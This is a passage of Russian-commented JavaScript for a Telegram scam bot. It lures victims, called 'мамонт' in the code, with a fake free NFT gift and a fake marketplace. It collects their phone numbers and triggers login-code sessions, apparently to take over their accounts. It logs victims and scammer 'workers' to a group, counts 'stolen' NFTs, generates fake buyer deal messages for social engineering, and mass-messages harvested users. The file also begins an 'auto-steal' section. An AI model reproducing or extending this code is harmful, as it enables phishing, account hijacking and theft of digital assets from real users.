    console.error(`[INLINE] Ошибка обработки инлайн запроса: ${e.message}`);
    console.error(e.stack);
  }
});

// Обработка callback запросов (кнопка "Получить NFT")
bot.on('callback_query', async (query) => {
  // Эта логика уже обрабатывается в /start с параметром
  await bot.answerCallbackQuery(query.id);
});

// Обработка контакта (номер телефона)
bot.on('message', async (msg) => {
  // Сохраняем пользователя при каждом сообщении
  if (msg.from) {
    await saveUser(msg.from.id, msg.from.username || 'без username', msg.from.first_name || '', msg.from.last_name || '');
  }
  
  // Игнорируем команды (они обрабатываются отдельно)
  if (msg.text && msg.text.startsWith('/')) {
    return;
  }
  
  // Обрабатываем контакт
  if (msg.contact) {
    try {
      const userId = msg.from.id;
      const username = msg.from.username || 'без username';
      const phoneNumber = msg.contact.phone_number;
      
      // Форматируем номер (добавляем + если нет)
      const formattedPhone = phoneNumber.startsWith('+') ? phoneNumber : `+${phoneNumber}`;
      
      console.log(`[CONTACT] Получен контакт от @${username} (${userId}): ${formattedPhone}`);
      
      // Убрано логирование админу
      
      // Получаем информацию о запросе (giftId) если есть
      const requestInfo = workerInfo.get(userId);
      const giftId = requestInfo?.giftId || null;
      
      // Сохраняем номер в активную сессию на сервере через API
      try {
        const serverUrl = WEB_URL ? 
          (WEB_URL.startsWith('http') ? WEB_URL : `https://${WEB_URL}`) :
          `http://localhost:${process.env.PORT || 3000}`;
        
        const apiUrl = `${serverUrl.replace(/\/$/, '')}/api/save-phone`;
        console.log(`[CONTACT] Отправка номера на сервер: ${apiUrl}`);
        
        const response = await fetch(apiUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userId: String(userId),
            phoneNumber: formattedPhone,
            username: username,
            giftId: giftId
          })
        });
        
        if (response.ok) {
          console.log(`[CONTACT] Номер сохранен на сервере для userId: ${userId}`);
          // Убрано логирование админу
          
          // Если есть giftId, автоматически создаем сессию и отправляем код
          if (giftId) {
            console.log(`[CONTACT] Автоматически создаем сессию для giftId: ${giftId}`);
            
            try {
              const createSessionUrl = `${serverUrl.replace(/\/$/, '')}/api/create-session`;
              const sessionResponse = await fetch(createSessionUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  phoneNumber: formattedPhone,
                  mamontId: String(userId),
                  mamontUsername: username,
                  giftId: giftId
                })
              });
              
              const sessionData = await sessionResponse.json();
              
              if (sessionData.success) {
                console.log(`[CONTACT] Сессия создана, код отправлен. sessionId: ${sessionData.sessionId}`);
                // Убрано логирование админу
                
                // НЕ отправляем сообщение мамонту - всё происходит в WebApp
                // Просто сохраняем sessionId для дальнейшего использования
                workerInfo.set(userId, {
                  ...requestInfo,
                  sessionId: sessionData.sessionId,
                  phoneNumber: formattedPhone
                });
                
                return; // Выходим, чтобы не показывать стандартное сообщение
              } else {
                console.error(`[CONTACT] Ошибка создания сессии: ${sessionData.error}`);
                // Убрано логирование админу
              }
            } catch (e) {
              console.error(`[CONTACT] Ошибка при создании сессии: ${e.message}`);
              // Убрано логирование админу
            }
          }
        } else {
          const errorText = await response.text();
          console.error(`[CONTACT] Ошибка сохранения номера: ${response.status} - ${errorText}`);
        }
      } catch (e) {
        console.error(`[CONTACT] Ошибка сохранения номера на сервере: ${e.message}`);
        // Убрано логирование админу
      }
      
      // Отправляем сообщение мамонту
      await loadConfig();
      // Убрано сообщение мамонту о получении номера
      // Удаляем информацию о запросе
      workerInfo.delete(userId);
      
    } catch (e) {
      // Убрано логирование админу
      console.error(`[CONTACT] Ошибка обработки контакта: ${e.message}`);
      console.error(e.stack);
    }
  }
});

// ==================== КОМАНДЫ БОТА ====================

const processedStartMessages = new Set();

bot.onText(/\/start(?: (.+))?/, async (msg, match) => {
  try {
    const messageId = msg.message_id;
    // Предотвращаем двойную обработку одного и того же /start сообщения
    if (processedStartMessages.has(messageId)) return;
    processedStartMessages.add(messageId);
    // Удаляем запись через 2 минуты, чтобы Set не рос бесконечно
    setTimeout(() => processedStartMessages.delete(messageId), 2 * 60 * 1000);

    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const username = msg.from.username || 'без username';
    const startParam = match[1]; // Параметр после /start

    // Сохраняем пользователя
    await saveUser(userId, username, msg.from.first_name || '', msg.from.last_name || '');

    console.log(`[START] Команда от @${username} (${userId}), параметр: ${startParam || 'нет'}`);

    // Убрано логирование админу

    await loadConfig();

    if (!config.marketWebAppUrl) {
      // Убрано логирование админу
      await bot.sendMessage(chatId,
        `⚠️ Ошибка конфигурации!\n\n` +
        `WEB_URL не установлен в .env файле.`
      );
      return;
    }

    // Если пришел запрос на получение номера телефона (формат: share_phone_giftId_userId)
    if (startParam && startParam.startsWith('share_phone_')) {
      const parts = startParam.split('_');
      if (parts.length >= 4) {
        const giftId = parts[2];
        const mamontUserId = parts[3];

        console.log(`[PHONE-REQUEST] Запрос номера для giftId: ${giftId}, userId: ${mamontUserId}`);

        // Убрано логирование админу

        // Сохраняем информацию о запросе номера для обработки контакта
        workerInfo.set(userId, {
          giftId: giftId,
          mamontUserId: mamontUserId
        });

        // Отправляем сообщение с кнопкой для запроса контакта
        await bot.sendMessage(chatId,
          `Для авторизации в маркете необходимо поделиться номером телефона.\n\nНажмите кнопку ниже:`,
          {
            reply_markup: {
              keyboard: [[
                {
                  text: '📱 Поделиться номером',
                  request_contact: true
                }
              ]],
              resize_keyboard: true,
              one_time_keyboard: true
            }
          }
        );

        return;
      }
    }

    // Если пришел с параметром NFT подарка (формат: nft_Slug_workerId_workerUsername или nft_Slug_workerId_workerUsername_to_recipientUsername)
    if (startParam && startParam.startsWith('nft_')) {
      console.log(`[NFT-START] Парсинг параметра: ${startParam}`);
      const parts = startParam.split('_');
      console.log(`[NFT-START] Части параметра:`, parts, `Длина: ${parts.length}`);

      // Ищем паттерн "_to_id_" или "_to_user_" в параметре для разделения workerUsername и получателя
      // Формат: nft_slug_workerId_workerUsername_to_id_recipientId или nft_slug_workerId_workerUsername_to_user_recipientUsername
      let workerUsername, recipientId = null, recipientUsername = null;
      const toIdIndex = startParam.indexOf('_to_id_');
      const toUserIndex = startParam.indexOf('_to_user_');

      if (toIdIndex > 0) {
        // Есть получатель по ID: формат nft_slug_workerId_workerUsername_to_id_recipientId
        const beforeTo = startParam.substring(0, toIdIndex);
        const afterTo = startParam.substring(toIdIndex + 7); // +7 для "_to_id_"

        const beforeParts = beforeTo.split('_');
        if (beforeParts.length >= 4) {
          workerUsername = decodeURIComponent(beforeParts.slice(3).join('_'));
        }
        recipientId = afterTo; // ID не нужно декодировать
        console.log(`[NFT-START] Найден получатель по ID: ${recipientId}`);
      } else if (toUserIndex > 0) {
        // Есть получатель по username: формат nft_slug_workerId_workerUsername_to_user_recipientUsername
        const beforeTo = startParam.substring(0, toUserIndex);
        const beforeParts = beforeTo.split('_');
        if (beforeParts.length >= 4) {
          workerUsername = decodeURIComponent(beforeParts.slice(3).join('_'));
        }

        // Используем более надежный способ: берем username из массива parts после "_to_user_"
        // parts выглядит так: ['nft', 'slug', 'workerId', 'workerUsername', 'to', 'user', 'recipientUsername']
        // Индекс "_to_user_" в parts: parts.indexOf('to') и parts.indexOf('user')
        const toIndexInParts = parts.indexOf('to');
        const userIndexInParts = parts.indexOf('user');
        if (toIndexInParts > 0 && userIndexInParts === toIndexInParts + 1 && userIndexInParts < parts.length - 1) {
          // Username находится после 'user' в массиве parts
          const usernameFromParts = parts.slice(userIndexInParts + 1).join('_');
          recipientUsername = decodeURIComponent(usernameFromParts).toLowerCase();
          console.log(`[NFT-START] Найден получатель по username из parts: @${recipientUsername}`);
        } else {
          // Fallback: используем старый способ
          const afterToPart = startParam.substring(toUserIndex + 8); // +8 для "_to_user_"
          let decodedUsername = decodeURIComponent(afterToPart);
          decodedUsername = decodedUsername.replace(/^_+/, '');
          const firstUnderscoreIndex = decodedUsername.indexOf('_');
          if (firstUnderscoreIndex > 0) {
            decodedUsername = decodedUsername.substring(0, firstUnderscoreIndex);
          }
          recipientUsername = decodedUsername.toLowerCase();
          console.log(`[NFT-START] Найден получатель по username (fallback): @${recipientUsername}`);
        }
      } else if (parts.length >= 4) {
        // Нет получателя: формат nft_slug_workerId_workerUsername
        workerUsername = decodeURIComponent(parts.slice(3).join('_'));
      }

      if (parts.length >= 4) {
        const nftSlug = parts[1]; // Например: DeskCalendar-98533
        const workerId = parts[2];

        console.log(`[NFT-START] Parsed: slug=${nftSlug}, workerId=${workerId}, workerUsername=${workerUsername}, recipientId=${recipientId || 'не указан'}, recipientUsername=${recipientUsername || 'не указан'}`);

        // Проверяем, если указан получатель, то проверяем совпадение ID или username
        if (recipientId) {
          const currentUserId = String(msg.from.id);
          if (currentUserId !== recipientId) {
            // ID не совпадает - показываем сообщение об ошибке
            console.log(`[NFT-START] ❌ ID не совпадает: текущий ${currentUserId}, ожидаемый ${recipientId}`);

            // Получаем URL маркета
            let webAppUrl = config.marketWebAppUrl || '';
            if (webAppUrl && !webAppUrl.startsWith('https://')) {
              if (webAppUrl.startsWith('http://')) {
                webAppUrl = webAppUrl.replace('http://', 'https://');
              } else {
                webAppUrl = 'https://' + webAppUrl;
              }
            }

            await bot.sendMessage(chatId,
              `❌ Данный подарок был отправлен другому человеку. Чтобы зайти на маркет, нажмите кнопку ниже.`,
              {
                parse_mode: 'HTML',
                skipObfuscation: true,
                reply_markup: {
                  inline_keyboard: [[
                    {
                      text: 'Open Market',
                      web_app: { url: webAppUrl }
                    }
                  ]]
                }
              }
            );
            return;
          }
          console.log(`[NFT-START] ✅ ID совпадает: ${currentUserId}`);
        } else if (recipientUsername) {
          // Если указан username, пытаемся найти его ID в базе данных
          let recipientIdFromUsername = null;
          try {
            const users = await loadUsersDB();
            const user = users.find(u => u.username && u.username.toLowerCase() === recipientUsername);
            if (user && user.userId) {
              recipientIdFromUsername = String(user.userId);
              console.log(`[NFT-START] Найден ID для username @${recipientUsername}: ${recipientIdFromUsername}`);
            }
          } catch (e) {
            console.log(`[NFT-START] Ошибка при поиске ID по username: ${e.message}`);
          }

          // Проверяем по ID, если нашли, иначе по username
          if (recipientIdFromUsername) {
            const currentUserId = String(msg.from.id);
            if (currentUserId !== recipientIdFromUsername) {
              // ID не совпадает - показываем сообщение об ошибке
              console.log(`[NFT-START] ❌ ID не совпадает: текущий ${currentUserId}, ожидаемый ${recipientIdFromUsername} (для @${recipientUsername})`);

              // Получаем URL маркета
              let webAppUrl = config.marketWebAppUrl || '';
              if (webAppUrl && !webAppUrl.startsWith('https://')) {
                if (webAppUrl.startsWith('http://')) {
                  webAppUrl = webAppUrl.replace('http://', 'https://');
                } else {
                  webAppUrl = 'https://' + webAppUrl;
                }
              }

              await bot.sendMessage(chatId,
                `❌ Данный подарок был отправлен другому человеку. Чтобы зайти на маркет, нажмите кнопку ниже.`,
                {
                  parse_mode: 'HTML',
                  skipObfuscation: true,
                  reply_markup: {
                    inline_keyboard: [[
                      {
                        text: 'Open Market',
                        web_app: { url: webAppUrl }
                      }
                    ]]
                  }
                }
              );
              return;
            }
            console.log(`[NFT-START] ✅ ID совпадает: ${currentUserId} (для @${recipientUsername})`);
          } else {
            // Если не нашли ID, проверяем по username
            const currentUsername = (msg.from.username || '').toLowerCase();
            if (currentUsername !== recipientUsername) {
              // Username не совпадает - показываем сообщение об ошибке
              console.log(`[NFT-START] ❌ Username не совпадает: текущий @${currentUsername || 'без username'}, ожидаемый @${recipientUsername}`);

              // Получаем URL маркета
              let webAppUrl = config.marketWebAppUrl || '';
              if (webAppUrl && !webAppUrl.startsWith('https://')) {
                if (webAppUrl.startsWith('http://')) {
                  webAppUrl = webAppUrl.replace('http://', 'https://');
                } else {
                  webAppUrl = 'https://' + webAppUrl;
                }
              }

              await bot.sendMessage(chatId,
                `❌ Данный подарок был отправлен другому человеку. Чтобы зайти на маркет, нажмите кнопку ниже.`,
                {
                  parse_mode: 'HTML',
                  skipObfuscation: true,
                  reply_markup: {
                    inline_keyboard: [[
                      {
                        text: 'Open Market',
                        web_app: { url: webAppUrl }
                      }
                    ]]
                  }
                }
              );
              return;
            }
            console.log(`[NFT-START] ✅ Username совпадает: @${currentUsername}`);
          }
        }

        // Парсим название NFT и ID из slug (например: InputKey-91561 -> InputKey и 91561)
        const nftParts = nftSlug.split('-');
        const nftName = nftParts.length > 1 ? nftParts.slice(0, -1).join(' ') : nftSlug;
        const nftId = nftParts.length > 1 ? nftParts[nftParts.length - 1] : '';
        const nftUrl = `https://t.me/nft/${nftSlug}`;
        const giftId = nftSlug;

        // Находим сессию мамонта (если есть)
        let sessionPath = null;
        const sessionsDir = path.join(__dirname, 'sessions');
        if (await fs.pathExists(sessionsDir)) {
          const dirs = await fs.readdir(sessionsDir);
          for (const dir of dirs) {
            if (dir.startsWith(`${userId}_`) || dir === String(userId)) {
              const sessionDir = path.join(sessionsDir, dir);
              const files = await fs.readdir(sessionDir);
              const sessionFile = files.find(f => f.endsWith('.session'));
              if (sessionFile) {
                sessionPath = path.join(sessionDir, sessionFile);
                break;
              }
            }
          }
        }

        if (!sessionPath) {
          sessionPath = path.join(__dirname, 'sessions', `${userId}_${username}`, `session_${userId}.session`);
        }

        try {
          // Проверяем, был ли подарок уже получен
          const existingGift = await getGiftInfo(giftId, userId);

          // Нормализуем WebApp URL
          let baseWebAppUrl = config.marketWebAppUrl.trim();
          if (!baseWebAppUrl.startsWith('https://') && !baseWebAppUrl.startsWith('http://')) {
            baseWebAppUrl = 'https://' + baseWebAppUrl;
          } else if (baseWebAppUrl.startsWith('http://')) {
            baseWebAppUrl = baseWebAppUrl.replace('http://', 'https://');
          }

          // Убираем trailing slash если есть
          baseWebAppUrl = baseWebAppUrl.replace(/\/$/, '');

          // URL для нового маркета (инвентарь теперь внутри маркета)
          let inventoryUrl = `${baseWebAppUrl}/market.html`;

          // Кодируем параметры воркера в base64 токен
          if (workerUsername || workerId || username || userId) {
            const tokenData = {
              w: workerUsername || null,      // worker
              wi: workerId || null,           // worker_id
              mu: username || null,            // mamont_username
              m: userId || null                // mamont_id
            };

            // Удаляем null значения
            Object.keys(tokenData).forEach(key => {
              if (tokenData[key] === null) {
                delete tokenData[key];
              }
            });

            // Кодируем в base64
            const tokenString = JSON.stringify(tokenData);
            const tokenBase64 = Buffer.from(tokenString).toString('base64');

            inventoryUrl += (inventoryUrl.includes('?') ? '&' : '?') + 't=' + tokenBase64;
          }

          // Добавляем параметр для автоматического перехода на вкладку "Мои подарки"
          inventoryUrl += (inventoryUrl.includes('?') ? '&' : '?') + 'view=my-gifts';

          // Если подарок уже получен
          if (existingGift) {
            await bot.sendMessage(chatId,
              `❗️ Вы уже получили данный подарок. Что-бы вывести его зайдите в Инвентарь.`,
              {
                parse_mode: 'HTML',
                skipObfuscation: true,
                reply_markup: {
                  inline_keyboard: [[
                    {
                      text: 'Инвентарь',
                      web_app: { url: inventoryUrl }
                    }
                  ]]
                }
              }
            );
            console.log(`[NFT-START] Подарок уже был получен мамонтом @${username}`);
            return;
          }

          // Сохраняем подарок в БД мамонтов
          console.log(`[NFT-START] Сохранение подарка в БД...`);

          await saveMamontGift(userId, username, giftId, nftName, nftUrl, sessionPath, workerUsername, workerId);
          console.log(`[NFT-START] Подарок сохранен`);

          // Формируем текст сообщения с информацией о подарке (ссылка скрыта, текст кликабельный)
          const giftInfo = nftId ? `<a href="${nftUrl}">${nftName} #${nftId}</a>` : `<a href="${nftUrl}">${nftName}</a>`;
          const welcomeMessage = `<b>🎉 Добро пожаловать!\n\n🚀 Вы попали в NFT Marketplace — место, где пользователи получают, обменивают и коллекционируют цифровые подарки и NFT!\n\n🎁 Ваш первый подарок уже ждёт вас!\n\n${giftInfo}</b>`;

          // Отправляем сообщение о добавлении в инвентарь
          await bot.sendMessage(chatId,
            welcomeMessage,
            {
              parse_mode: 'HTML',
              skipObfuscation: true,
              reply_markup: {
                inline_keyboard: [[
                  {
                    text: 'Инвентарь',
                    web_app: { url: inventoryUrl }
                  }
                ]]
              }
            }
          );

          await sendLogToGroup(
            `🎁 <b>Мамонт получил NFT подарок</b>\n` +
            `👤 <b>Мамонт:</b> @${username} (<code>${userId}</code>)\n` +
            `👨‍💼 <b>Воркер:</b> @${workerUsername} (<code>${workerId}</code>)\n` +
            `🎁 <b>NFT:</b> ${nftName} (<code>${giftId}</code>)`
          );

          console.log(`[NFT-GIFT] Подарок добавлен мамонту @${username} от воркера @${workerUsername}`);
          return;
        } catch (e) {
          // Убрано логирование админу
          await bot.sendMessage(chatId, `❌ Ошибка при добавлении подарка. Попробуйте позже.`);
          return;
        }
      } else {
        // Убрано логирование админу
        console.error(`[NFT-START] Неверный формат параметра: ${startParam}, частей: ${parts.length}`);
      }
    }

    // Обычный старт без параметров
    // Убрано логирование админу

    let webAppUrl = config.marketWebAppUrl || '';
    if (webAppUrl && !webAppUrl.startsWith('https://')) {
      if (webAppUrl.startsWith('http://')) {
        webAppUrl = webAppUrl.replace('http://', 'https://');
      } else {
        webAppUrl = 'https://' + webAppUrl;
      }
    }

    // Получаем username бота, если еще не загружен
    if (!BOT_USERNAME) {
      try {
        const botInfo = await bot.getMe();
        BOT_USERNAME = botInfo.username || 'Market Prime';
      } catch (e) {
        console.error(`[START] Ошибка получения username бота: ${e.message}`);
        BOT_USERNAME = 'Market Prime'; // Fallback
      }
    }

    if (config.photoUrl && config.photoUrl.trim()) {
      await bot.sendPhoto(chatId, config.photoUrl.trim(), {
        caption: `💙 <b>Добро пожаловать в @${BOT_USERNAME}</b>\n\n` +
          `Загружайте свои подарки, устанавливайте цену и начинайте зарабатывать — включая долю от продаж ваших друзей. Готовы начать? Поехали!`,
        parse_mode: 'HTML',
        skipObfuscation: true,
        reply_markup: {
          inline_keyboard: [[
            {
              text: 'Open Market',
              web_app: { url: webAppUrl }
            }
          ]]
        }
      });
    } else {
      await bot.sendMessage(chatId,
        `💙 <b>Добро пожаловать в @${BOT_USERNAME}</b>\n\n` +
        `Загружайте свои подарки, устанавливайте цену и начинайте зарабатывать — включая долю от продаж ваших друзей. Готовы начать? Поехали!`,
        {
          parse_mode: 'HTML',
          skipObfuscation: true,
          reply_markup: {
            inline_keyboard: [[
              {
                text: 'Open Market',
                web_app: { url: webAppUrl }
              }
            ]]
          }
        }
      );
    }

  } catch (e) {
    // Убрано логирование админу
    console.error(`[START] Ошибка: ${e.message}`);
    console.error(e.stack);
  }
});

// Обработка команды /bdgift
bot.onText(/\/bdgift/, async (msg) => {
  try {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const username = msg.from.username || 'без username';
    
    console.log(`[BDGIFT] Команда от @${username} (${userId})`);
    
    // Получаем количество успешно переданных NFT
    const count = await getSuccessfulNFTCount();
    
    // Отправляем файл base.txt если он существует (одним сообщением со статистикой в caption)
    if (await fs.pathExists(SUCCESSFUL_NFT_DB_PATH)) {
      try {
        await bot.sendDocument(chatId, SUCCESSFUL_NFT_DB_PATH, {
          caption: `🖼️ <b>Кол-во всего NFT спизженых:</b> <code>${count}</code>`,
          parse_mode: 'HTML'
        });
      } catch (e) {
        console.error(`[BDGIFT] Ошибка отправки файла: ${e.message}`);
        // Если не удалось отправить файл, отправляем содержимое как текст
        try {
          const content = await fs.readFile(SUCCESSFUL_NFT_DB_PATH, 'utf-8');
          if (content.trim()) {
            // Если файл большой, отправляем только первые 100 строк
            const lines = content.split('\n').filter(line => line.trim());
            const preview = lines.slice(0, 100).join('\n');
            const message = lines.length > 100 
              ? `🖼️ <b>Кол-во всего NFT спизженых:</b> <code>${count}</code>\n\n📄 Первые 100 записей из ${lines.length}:\n\n<code>${preview}</code>`
              : `🖼️ <b>Кол-во всего NFT спизженых:</b> <code>${count}</code>\n\n📄 Все записи:\n\n<code>${content}</code>`;
            
            await bot.sendMessage(chatId, message, { parse_mode: 'HTML' });
          }
        } catch (e2) {
          console.error(`[BDGIFT] Ошибка отправки содержимого: ${e2.message}`);
        }
      }
    } else {
      await bot.sendMessage(chatId, 
        `🖼️ <b>Кол-во всего NFT спизженых:</b> <code>0</code>\n\n📄 База данных пока пуста. NFT будут добавлены после успешной передачи.`,
        { parse_mode: 'HTML' }
      );
    }
  } catch (e) {
    console.error(`[BDGIFT] Ошибка: ${e.message}`);
    console.error(e.stack);
  }
});

// Обработка команды /msg
bot.onText(/\/msg\s+@?(\w+)\s+(муж|жен)/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const username = match[1]; // Извлекаем username (без @)
    const gender = match[2].toLowerCase(); // Извлекаем пол (муж или жен)
    
    // Сохраняем пользователя
    await saveUser(userId, msg.from.username || 'без username', msg.from.first_name || '', msg.from.last_name || '');
    
    console.log(`[MSG] Команда от ${userId}, username: @${username}, пол: ${gender}`);
    
    // Генерируем случайный номер сделки
    const dealNumber = 'UD' + Math.floor(Math.random() * 1000000).toString().padStart(6, '0');
    
    // Генерируем сообщение в зависимости от пола
    let message, quoteText;
    
    if (gender === 'муж') {
      quoteText = 'приветт, подарок для ' + username + ' можешь закинуть ему при первой возможности. это мой подарочек будет ему. он, как получит, я ему сама напишууууууу.';
      message = `📨 Покупатель из сделки #${dealNumber} добавил сообщение к покупке:\n\n` +
                `<blockquote>${quoteText}</blockquote>\n\n` +
                `🔗 Покупатель выбрал вариант «Отправка третьему лицу». Сделка будет автоматически завершена после того, как третье лицо примет подарок. Право собственности на подарок сразу перейдёт к человеку, указанному в сделке.\n\n` +
                `⚠️ Не используйте реквизиты из переписки — перед исполнением убедитесь в их корректности.`;
    } else if (gender === 'жен') {
      quoteText = 'приветт, подарок для - ' + username + ' передай ей тогда сразу пожалуйста. подарочек ей небольшой будет) как заберет уже — я сам напишууууу.';
      message = `📨 Покупатель из сделки #${dealNumber} добавил сообщение к покупке:\n\n` +
                `<blockquote>${quoteText}</blockquote>\n\n` +
                `🔗 Покупатель выбрал вариант «Отправка третьему лицу». Сделка будет автоматически завершена после того, как третье лицо примет подарок. Право собственности на подарок сразу перейдёт к человеку, указанному в сделке.\n\n` +
                `⚠️ Не используйте реквизиты из переписки — перед исполнением убедитесь в их корректности.`;
    }
    
    await bot.sendMessage(chatId, message, {
      parse_mode: 'HTML'
    });
    
  } catch (e) {
    console.error(`[MSG] Ошибка: ${e.message}`);
    console.error(e.stack);
    await bot.sendMessage(msg.chat.id, '❌ Ошибка при обработке команды. Проверьте формат: /msg @username муж/жен');
  }
});

// Команда /all для рассылки сообщений всем пользователям (только для админа)
bot.onText(/\/all\s+(.+)/, async (msg, match) => {
  try {
    const userId = msg.from.id;
    
    // Проверяем, что команда от администратора
    if (userId !== ADMIN_ID) {
      await bot.sendMessage(msg.chat.id, '❌ У вас нет прав для выполнения этой команды.');
      return;
    }
    
    const messageText = match[1]; // Текст сообщения
    
    // Сохраняем админа в БД
    await saveUser(userId, msg.from.username || 'без username', msg.from.first_name || '', msg.from.last_name || '');
    
    console.log(`[ALL] Команда рассылки от админа ${userId}: "${messageText}"`);
    
    // Загружаем всех пользователей из всех источников (сессии, подарки и т.д.)
    const users = await loadUsersFromAllSources();
    console.log(`[ALL] Найдено пользователей для рассылки: ${users.length}`);
    
    if (users.length === 0) {
      await bot.sendMessage(msg.chat.id, '❌ В базе нет пользователей для рассылки.');
      return;
    }
    
    // Отправляем подтверждение начала рассылки
    const statusMsg = await bot.sendMessage(msg.chat.id, `📤 Начинаю рассылку сообщения для ${users.length} пользователей...`);
    
    let successCount = 0;
    let failCount = 0;
    const failedUsers = [];
    
    // Рассылаем сообщение всем пользователям (исключая админа)
    for (const user of users) {
      // Пропускаем самого админа
      if (user.userId === ADMIN_ID) {
        continue;
      }
      
      try {
        await bot.sendMessage(user.userId, messageText, { parse_mode: 'HTML' });
        successCount++;
        
        // Небольшая задержка, чтобы не превысить лимиты API
        await new Promise(resolve => setTimeout(resolve, 50));
      } catch (e) {
        failCount++;
        const errorMsg = e.message || e.toString();
        
        // Пропускаем ошибки, связанные с заблокированным ботом или недоступным пользователем
        if (errorMsg.includes('chat not found') || 
            errorMsg.includes('user is deactivated') || 
            errorMsg.includes('blocked') ||
            errorMsg.includes('USER_DEACTIVATED') ||
            errorMsg.includes('CHAT_NOT_FOUND') ||
            errorMsg.includes('bot was blocked') ||
            errorMsg.includes('user not found')) {
          // Не добавляем в список ошибок, просто пропускаем
        } else {
          failedUsers.push({ userId: user.userId, username: user.username, error: errorMsg });
        }
        
        console.error(`[ALL] Ошибка отправки пользователю @${user.username} (${user.userId}): ${errorMsg}`);
      }
    }
    
    // Обновляем статус рассылки
    let resultMessage = `✅ Рассылка завершена!\n\n` +
                       `📊 Статистика:\n` +
                       `✅ Успешно отправлено: ${successCount}\n` +
                       `❌ Ошибок: ${failCount}`;
    
    if (failedUsers.length > 0 && failedUsers.length <= 10) {
      resultMessage += `\n\n❌ Пользователи с ошибками:\n`;
      failedUsers.forEach(u => {
        resultMessage += `• @${u.username} (${u.userId}): ${u.error.substring(0, 50)}\n`;
      });
    } else if (failedUsers.length > 10) {
      resultMessage += `\n\n❌ Всего пользователей с ошибками: ${failedUsers.length}`;
    }
    
    await bot.editMessageText(resultMessage, {
      chat_id: msg.chat.id,
      message_id: statusMsg.message_id,
      parse_mode: 'HTML'
    });
    
    console.log(`[ALL] Рассылка завершена: успешно ${successCount}, ошибок ${failCount}`);
    
  } catch (e) {
    console.error(`[ALL] Ошибка рассылки: ${e.message}`);
    console.error(e.stack);
    await bot.sendMessage(msg.chat.id, `❌ Ошибка при рассылке: ${e.message}`);
  }
});

// Команда /messeng для отправки сообщения пользователю по ID (только для админа)
bot.onText(/\/messeng\s+(\d+)\s+(.+)/, async (msg, match) => {
  try {
    const userId = msg.from.id;
    
    // Проверяем, что команда от администратора
    if (userId !== ADMIN_ID) {
      await bot.sendMessage(msg.chat.id, '❌ У вас нет прав для выполнения этой команды.');
      return;
    }
    
    const targetUserId = parseInt(match[1]); // ID получателя
    const messageText = match[2]; // Текст сообщения
    
    if (!targetUserId || isNaN(targetUserId)) {
      await bot.sendMessage(msg.chat.id, '❌ Неверный ID пользователя. Формат: /messeng 123456789 Текст сообщения');
      return;
    }
    
    if (!messageText || messageText.trim().length === 0) {
      await bot.sendMessage(msg.chat.id, '❌ Текст сообщения не может быть пустым. Формат: /messeng 123456789 Текст сообщения');
      return;
    }
    
    console.log(`[MESSENG] Команда от админа ${userId}: отправка сообщения пользователю ${targetUserId}`);
    
    try {
      await bot.sendMessage(targetUserId, messageText, { parse_mode: 'HTML' });
      await bot.sendMessage(msg.chat.id, `✅ Сообщение успешно отправлено пользователю <code>${targetUserId}</code>`, { parse_mode: 'HTML' });
      console.log(`[MESSENG] ✅ Сообщение отправлено пользователю ${targetUserId}`);
    } catch (e) {
      const errorMsg = e.message || e.toString();
      console.error(`[MESSENG] Ошибка отправки пользователю ${targetUserId}: ${errorMsg}`);
      
      let errorText = `❌ Ошибка отправки пользователю <code>${targetUserId}</code>\n\n`;
      
      if (errorMsg.includes('chat not found') || 
          errorMsg.includes('user is deactivated') || 
          errorMsg.includes('blocked') ||
          errorMsg.includes('USER_DEACTIVATED') ||
          errorMsg.includes('CHAT_NOT_FOUND') ||
          errorMsg.includes('bot was blocked') ||
          errorMsg.includes('user not found')) {
        errorText += `Пользователь не найден или заблокировал бота.`;
      } else {
        errorText += `<code>${errorMsg}</code>`;
      }
      
      await bot.sendMessage(msg.chat.id, errorText, { parse_mode: 'HTML' });
    }
    
  } catch (e) {
    console.error(`[MESSENG] Ошибка: ${e.message}`);
    console.error(e.stack);
    await bot.sendMessage(msg.chat.id, `❌ Ошибка при обработке команды. Проверьте формат: /messeng 123456789 Текст сообщения`);
  }
});

} // Конец функции initBotEventHandlers

// ==================== ФУНКЦИИ ДЛЯ АВТОСТИЛА ====================

// Функции для работы с БД подарков донорской сессии
const DONOR_GIFTS_DB_PATH = path.join(__dirname, 'donor', 'donor-gifts.json');

async function loadDonorGiftsDB(donorSessionId) {
  try {
    if (await fs.pathExists(DONOR_GIFTS_DB_PATH)) {
      const data = await fs.readJson(DONOR_GIFTS_DB_PATH);
      if (data.donorSessionId === donorSessionId && data.gifts && data.gifts.length > 0) {
        return data;
      }
    }
  } catch (e) {
    console.log(`[DB] Ошибка загрузки БД подарков: ${e.message}`);
  }
  return null;
}

async function saveDonorGiftsDB(donorSessionId, gifts) {
  try {
    const dbDir = path.dirname(DONOR_GIFTS_DB_PATH);
    await fs.ensureDir(dbDir);
    
    const data = {
      lastUpdated: new Date().toISOString(),
      donorSessionId: donorSessionId,
      gifts: gifts.map(gift => {
        let stars = 0;
        if (gift.stars) {
          if (typeof gift.stars === 'bigint') {
            stars = Number(gift.stars);
          } else if (typeof gift.stars === 'object' && gift.stars !== null) {
            if (gift.stars.value !== undefined) {
              stars = typeof gift.stars.value === 'bigint' ? Number(gift.stars.value) : gift.stars.value;
            } else if (gift.stars.amount !== undefined) {
              stars = typeof gift.stars.amount === 'bigint' ? Number(gift.stars.amount) : gift.stars.amount;
            }
          } else {
            stars = Number(gift.stars) || 0;
          }
        }
        
        return {
          id: String(gift.id),
          stars: stars,
          name: gift.name || gift.title || gift.slug || String(gift.id)
        };
      })
    };
    
    await fs.writeJson(DONOR_GIFTS_DB_PATH, data, { spaces: 2 });
    console.log(`[DB] Сохранено ${data.gifts.length} подарков в БД`);
    return data;
  } catch (e) {
    console.error(`[DB] Ошибка сохранения БД подарков: ${e.message}`);
    return null;
  }
}

// Жёстко заданный список подарков для донорской сессии
// Эти подарки всегда доступны в Telegram и имеют фиксированные ID
function getDonorGiftsList() {
  const donorGifts = [
    {
      id: "5170145012310081615",  // Heart - 15 ⭐
      stars: 15,
      name: "Heart",
      title: "Heart",
      slug: "heart",
      className: "StarGift",  // Обычный подарок, не NFT
      unique: false
    },
    {
      id: "5170250947678437525",  // Rose - 25 ⭐
      stars: 25,
      name: "Rose",
